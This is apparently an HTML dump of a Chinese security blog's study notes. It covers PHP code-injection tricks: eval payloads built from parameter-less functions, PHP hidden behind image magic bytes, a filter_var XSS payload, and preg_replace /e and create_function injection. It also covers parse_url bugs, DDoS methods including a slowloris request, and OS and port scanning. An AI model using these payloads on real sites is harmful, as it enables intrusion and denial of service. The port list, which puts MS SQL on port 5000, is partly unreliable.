+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code>getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)
+array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+
+getallheaders()     获取全部 HTTP 请求头信息, 是下方函数的别名
+apache_request_headers  获取全部 HTTP 请求头信息
+这两个函数只适用于apache服务器 
+可用于读取构造header注入
+----
+array(11) {
+  [&quot;Accept-Language&quot;]=&gt;
+  string(23) &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;
+  [&quot;Accept-Encoding&quot;]=&gt;
+  string(17) &quot;gzip, deflate, br&quot;
+  [&quot;Accept&quot;]=&gt;
+  string(3) &quot;*/*&quot;
+  [&quot;Content-Type&quot;]=&gt;
+  string(68) &quot;multipart/form-data; boundary=----WebKitFormBoundaryevLOjNPCJPGbsCBf&quot;
+  ...
+}
+----
+
+get_defined_vars() 函数返回由所有已定义变量所组成的数组。
+----
+array(4) {
+  [&quot;_GET&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_POST&quot;]=&gt;
+  array(1) {
+    [&quot;code&quot;]=&gt;
+    string(29) &quot;var_dump(get_defined_vars());&quot;
+  }
+  [&quot;_COOKIE&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_FILES&quot;]=&gt;
+  array(0) {
+  }
+}
+----//eval(end(current(get_defined_vars())));
+
+
+session_id() 可以用来获取/设置 当前会话 ID。
+session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。
+//eval(hex2bin(session_id(session_start())));
+</code></pre><h4 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h4><pre><code>getchwd() 函数返回当前工作目录。
+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+
+readfile()  输出一个文件
+
+current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end()       将内部指针指向数组中的最后一个元素，并输出。
+array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin — 转换十六进制字符串为二进制字符串
+
+getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)
+</code></pre><h3 id="函数漏洞"><a href="#函数漏洞" class="headerlink" title="函数漏洞"></a>函数漏洞</h3><h4 id="getimagesize图片验证绕过"><a href="#getimagesize图片验证绕过" class="headerlink" title="getimagesize图片验证绕过"></a>getimagesize图片验证绕过</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token string">'png.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token string">'gif.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'png.php'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'\x89PNG\r\n\x1a\n&lt;?php phpinfo(); ?>'</span><span class="token punctuation">)</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'gif.php'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">'GIF89a&lt;?php phpinfo(); ?>'</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2020/02/01/20200201/111.png" alt="img"></p>
+<h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h4><pre><code>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool
+</code></pre><p>只要第三个参数<code>$strict</code><strong>没有</strong>设置成<strong>TRUE</strong>，就不会进行强检查。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'7shell'</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$strict</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h4><pre><code>filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed
+</code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token function">filter_var</span><span class="token punctuation">(</span>'javascript<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//comment%250Aalert(1)', FILTER_VALIDATE_URL);</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上述代码可能会导致XSS攻击。</p>
+<p>因为<code>//</code>在JavaScript中表示单行注释，<code>%250a</code>解码后为换行符，所以<code>alert(1)</code>和<code>//</code>不在一行，js代码成功执行。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;a href='$url'>Next slide &lt;/a>"</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h4><pre><code>strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int
+</code></pre><p>如果查询到的字符在第一位，那么返回为数字为0；而查询不到的结果也为false。<br>0和false取反皆为true，如果不注意就有可能造成错误。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string">'baa'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 0</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token function">parse_str</span> <span class="token punctuation">(</span> string <span class="token variable">$encoded_string</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token operator">&amp;</span><span class="token variable">$result</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> void
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>parse_str的作用就是解析字符串并且注册成变量，但是在注册变量之前，他不会验证当前变量是否存在，所以会覆盖掉当前作用域中原有的变量。 <img src="https://j7ur8.github.io/WebBook/images/19-7-9_PHP_parse_str_1.png" alt="img"></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$j7ur8</span><span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">;</span>
+<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token string">'j7ur8=didi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$j7ur8</span><span class="token punctuation">;</span> 
+<span class="token shell-comment comment"># didi php&lt;7.2</span>
+<span class="token shell-comment comment"># PHP Deprecated:  parse_str(): Calling parse_str() without the result argu</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><pre><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed
+</code></pre><p>$pattern 存在<code>/e</code>模式修正符，允许代码执行。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string">'strtolower("\1")'</span><span class="token punctuation">,</span><span class="token string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>以上代码能执行除了<code>preg_replace</code>的<code>/e</code>修饰符可以执行代码外，还一个原因是strtolower函数使用了<code>&quot;&quot;</code>。我们知道<code>&quot;&quot;</code>内部是可以引用变量的。如：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'asfd'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#asf</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span> <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span> <span class="token string">'}phpinfo();{'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># 执行phpifno()</span>
+<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span> <span class="token string">'}phpinfo();/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>因为create_function采用拼接的方法构造函数，所以上述过程可以想象成如下：</p>
+<pre class="line-numbers language-php"><code class="language-php">源代码：
+<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"test"</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+注入后代码：
+<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*;}
+
+*/</span>  <span class="token shell-comment comment">### 这一行是为了关闭上一个注入代码的注释</span>
+注入后的代码：
+<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">echo</span> <span class="token string">"test"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><h5 id="错误的解析hostname"><a href="#错误的解析hostname" class="headerlink" title="错误的解析hostname"></a>错误的解析hostname</h5><h4 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h4><ul>
+<li>PHP5.x &lt; php5.6.28</li>
+<li>PHP7.0 &lt; php7.0.13</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">parse_url</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com:80#@google.com/")["host"]."\n"; #google.com</span>
+<span class="token keyword">echo</span> <span class="token function">parse_url</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com:80?@google.com/")["host"]."\n"; #google.com</span>
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com:80#@google.com");       # example.com </span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="不解析有端口但没有协议网址"><a href="#不解析有端口但没有协议网址" class="headerlink" title="不解析有端口但没有协议网址"></a>不解析有端口但没有协议网址</h5><h4 id="利用范围-1"><a href="#利用范围-1" class="headerlink" title="利用范围"></a>利用范围</h4><ul>
+<li>PHP5.6 &lt; PHP5.6.8</li>
+<li>PHP5.5 &lt; PHP5.5.24</li>
+<li>PHP5.4.x</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span>'<span class="token comment" spellcheck="true">//example.org:81/hi?a=b#c=d'));   // </span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span>'<span class="token comment" spellcheck="true">//example.org/hi?a=b#c=d'));   //Array([host] => example.org [path] => /hi [query] => a=b [fragment] => c=d )</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h5 id="无法解析空用户名和密码"><a href="#无法解析空用户名和密码" class="headerlink" title="无法解析空用户名和密码"></a>无法解析空用户名和密码</h5><ul>
+<li>PHP5.6 &lt; PHP5.6.3</li>
+<li>PHP5.5 &lt; PHP5.5.19</li>
+<li>PHP5.4.x</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// correct (returns empty username)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">parse_url</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//@example.com' ) );</span>
+<span class="token comment" spellcheck="true">// incorrect (doesn't return empty username or password)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">parse_url</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//:@example.com' ) );</span>
+<span class="token comment" spellcheck="true">// incorrect (doesn't return empty username)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">parse_url</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//:password@example.com' ) );</span>
+<span class="token comment" spellcheck="true">// incorrect (doesn't return empty password)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">parse_url</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//username:@example.com' ) );</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="对于-的解析错误"><a href="#对于-的解析错误" class="headerlink" title="对于//的解析错误"></a>对于//的解析错误</h5><ul>
+<li>php5.x &lt; php5.4.7</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span>'<span class="token comment" spellcheck="true">//example.org'));  # array(1) {'path' => string(14) "//example.org"}</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token operator">/</span>xxx<span class="token punctuation">.</span>com<span class="token operator">/</span>abc<span class="token comment" spellcheck="true">//def?g=1&amp;e=2'))['path'] // def?g=1&amp;e=2</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span>'http<span class="token punctuation">:</span><span class="token operator">/</span>xxx<span class="token punctuation">.</span>com<span class="token operator">/</span>abc<span class="token comment" spellcheck="true">///def?g=1&amp;e=2'))['path'] // FALSE</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/安全/">安全</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-29T08:56:12.000Z"><a href="/2020/01/29/20200129/">2020-01-29</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/01/29/20200129/">2020年1月29日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="DDos简介"><a href="#DDos简介" class="headerlink" title="DDos简介"></a>DDos简介</h2><p>　　DDos又叫分布式拒绝服务，全称Distributed Denial of Service，利用DDos造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。<br>　　DDos攻击从层次上可分为<strong>网络层攻击</strong>与<strong>应用层攻击</strong>，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。</p>
+<h2 id="网络层DDos攻击"><a href="#网络层DDos攻击" class="headerlink" title="网络层DDos攻击"></a>网络层DDos攻击</h2><p>网络层DDos攻击包括SYN flood、UDP flood、ICMP flood等</p>
+<h3 id="SYN-flood攻击"><a href="#SYN-flood攻击" class="headerlink" title="SYN flood攻击"></a>SYN flood攻击</h3><p>　　SYN flood攻击主要利用了TCP三次握手过程中的bug，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于慢型dos攻击。</p>
+<h3 id="UDP-flood攻击"><a href="#UDP-flood攻击" class="headerlink" title="UDP flood攻击"></a>UDP flood攻击</h3><p>　　由于udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于大流量攻击。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。</p>
+<h3 id="ICMP-flood攻击"><a href="#ICMP-flood攻击" class="headerlink" title="ICMP flood攻击"></a>ICMP flood攻击</h3><p>　　此攻击属于大流量攻击，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包），因此这种方式已经落伍。</p>
+<h3 id="网络层DDos防御"><a href="#网络层DDos防御" class="headerlink" title="网络层DDos防御"></a>网络层DDos防御</h3><ul>
+<li>网络架构上做好优化，采用负载均衡分流。</li>
+<li>添加抗DDos设备，流量清洗。</li>
+<li>限制单ip请求频率。</li>
+<li>防火墙等防护设置禁止icmp包等</li>
+</ul>
+<h2 id="应用层DDos攻击"><a href="#应用层DDos攻击" class="headerlink" title="应用层DDos攻击"></a>应用层DDos攻击</h2><p>应用层DDos攻击不是发生在网络层，是发生在TCP建立握手成功之后，应用程序处理请求的时候。</p>
+<h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><p>　　CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求。</p>
+<h3 id="slowloris"><a href="#slowloris" class="headerlink" title="slowloris"></a>slowloris</h3><p>　　这是由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击。</p>
+<p>构造以下畸形http请求包</p>
+<pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1\r\n
+Host: Victim host\r\n
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
+Content-Length: 42\r\n
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>完整的http请求头结尾应该是两次的\r\n\r\n，这里少了一次，因此服务器将会一直等待。</p>
+<h3 id="HTTP-POST-DOS"><a href="#HTTP-POST-DOS" class="headerlink" title="HTTP POST DOS"></a>HTTP POST DOS</h3><p>　　其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。</p>
+<h3 id="Slow-Read-attack"><a href="#Slow-Read-attack" class="headerlink" title="Slow Read attack"></a>Slow Read attack</h3><p>　　Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。</p>
+<h3 id="Server-Limit-Dos"><a href="#Server-Limit-Dos" class="headerlink" title="Server Limit Dos"></a>Server Limit Dos</h3><p>　　这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）</p>
+<h3 id="ReDos"><a href="#ReDos" class="headerlink" title="ReDos"></a>ReDos</h3><p>　　这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。</p>
+<h3 id="应用层DDos防御"><a href="#应用层DDos防御" class="headerlink" title="应用层DDos防御"></a>应用层DDos防御</h3><ul>
+<li>判断User-Agent字段（不可靠，因为可以随意构造）</li>
+<li>网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）</li>
+<li>针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)</li>
+<li>关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。</li>
+<li>页面中添加验证码，比如搜索数据库时。</li>
+<li>编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。</li>
+</ul>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/安全/">安全</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-15T08:56:12.000Z"><a href="/2020/01/15/20200115/">2020-01-15</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/01/15/20200115/">2020年1月15日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="系统识别"><a href="#系统识别" class="headerlink" title="系统识别"></a>系统识别</h2><h3 id="p0f"><a href="#p0f" class="headerlink" title="p0f"></a>p0f</h3><p>p0f采用被动式的方法探测目标主机的操作系统类型。这个工具可以识别一下几种主机：</p>
+<ul>
+<li>连接到您主机的机器（SYN模式、即默认模式）</li>
+<li>您主机可以访问的机器（SYN+ACK模式）</li>
+<li>您主机不能访问的机器（RST+模式）</li>
+<li>您可以监控到期网络通信的机器</li>
+</ul>
+<p>这个程序通过自身发出的TCP数据包分析操作系统的类型。然后，它会统计在默认情况下不会产生的非标准数据包。例如，Linux内核操作系统默认使用64字节的ping数据包，而Windows操作系统则使用32字节的ping数据包。这两个操作系统在TTL值上同样存在差异。Windows发出的数据包，其TTL值是128；而不同版本的Linux操作系统，其数据包的TTL值各有所不同。p0f程序正是根据这些细微的差别识别远程主机的操作系统。</p>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Nmap是一款非常受欢迎的功能强大的端口扫描程序。它还能够识别操作系统的操作系统，能够进行主动式的操作系统指纹识别。如需使用操作系统识别功能，只需要在Namp选项中加入“-O”即可！</p>
+<h3 id="banner抓取"><a href="#banner抓取" class="headerlink" title="banner抓取"></a>banner抓取</h3><p>Banner抓取是最基础，最简单的指纹识别，不需要专门的工具就可以做，操作简单，通常获取的信息也相对准确，banner抓取是应用程序指纹识别而不是操作系统指纹识别。</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>常用到的协议对应的端口</strong></p>
+<ul>
+<li><p>TCP 21端口：FTP 文件传输服务</p>
+</li>
+<li><p>TCP 23端口：TELNET 终端仿真服务</p>
+</li>
+<li><p>TCP 25端口：SMTP 简单邮件传输服务</p>
+</li>
+<li><p>UDP 53端口：DNS 域名解析服务</p>
+</li>
+<li><p>TCP 80端口：HTTP 超文本传输服务</p>
+</li>
+<li><p>TCP 110端口：POP3 “邮局协议版本3”使用的端口</p>
+</li>
+<li><p>TCP 443端口：HTTPS 加密的超文本传输服务</p>
+</li>
+<li><p>TCP 1521端口：Oracle数据库服务</p>
+</li>
+<li><p>TCP 1863端口：MSN Messenger的文件传输功能所使用的端口</p>
+</li>
+<li><p>TCP 3306端口：Mysql数据库</p>
+</li>
+<li><p>TCP 3389端口：Microsoft RDP 微软远程桌面使用的端口</p>
+</li>
+<li><p>TCP 5631端口：Symantec pcAnywhere 远程控制数据传输时使用的端口</p>
+</li>
+<li><p>UDP 5632端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口</p>
+</li>
+<li><p>TCP 5000端口：MS SQL Server使用的端口</p>
+</li>
+<li><p>UDP 8000端口：腾讯QQ</p>
+</li>
+</ul>
+<h3 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a>Nmap端口扫描</h3><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具。</p>
